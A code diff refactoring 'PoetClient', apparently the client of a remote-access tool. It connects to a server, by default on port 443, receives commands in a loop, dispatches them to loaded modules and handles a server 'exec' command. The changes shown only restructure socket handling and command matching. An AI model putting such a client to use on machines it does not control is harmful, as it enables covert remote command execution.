@@ -51,16 +51,16 @@ class PoetClient(object):
     def __init__(self, host, port):
         self.host = host
         self.port = port
-        module.load_modules()
+        self.s = None
 
     def start(self):
         """Core Poet client functionality."""
 
-        s = PoetSocketClient(self.host, self.port)
+        self.s = PoetSocketClient(self.host, self.port)
         while True:
             try:
                 found = False
-                inp = s.recv()
+                inp = self.s.recv()
 
                 if inp == 'fin':
                     found = True
@@ -97,18 +97,19 @@ class PoetClient(object):
                 #     self.chint(s, inp)
 
                 for cmd, func in module.client_commands.iteritems():
-                    if inp == cmd:
+                    if inp.split()[0] == cmd:
                         found = True
-                        s.send(func())
+                        # self.s.send(func(self, inp))
+                        func(self, inp)
 
                 if not found:
-                    s.send('Unrecognized')
+                    self.s.send('Unrecognized')
             except socket.error as e:
                 if e.message == 'too much data!':
-                    s.send('posh : ' + e.message)
+                    self.s.send('posh : ' + e.message)
                 else:
                     raise
-        s.close()
+        self.s.close()
 
     def execute(self, inp):
         """Handle server `exec' command.
@@ -378,6 +379,9 @@ def main():
     PORT = int(args.port) if args.port else 443
 
     debug.info(('Poet started with interval of {} seconds to port {}. Ctrl-c to exit').format(args.interval, PORT))
+
+    # dynamically load all modules
+    module.load_modules()
 
     try:
         while True:
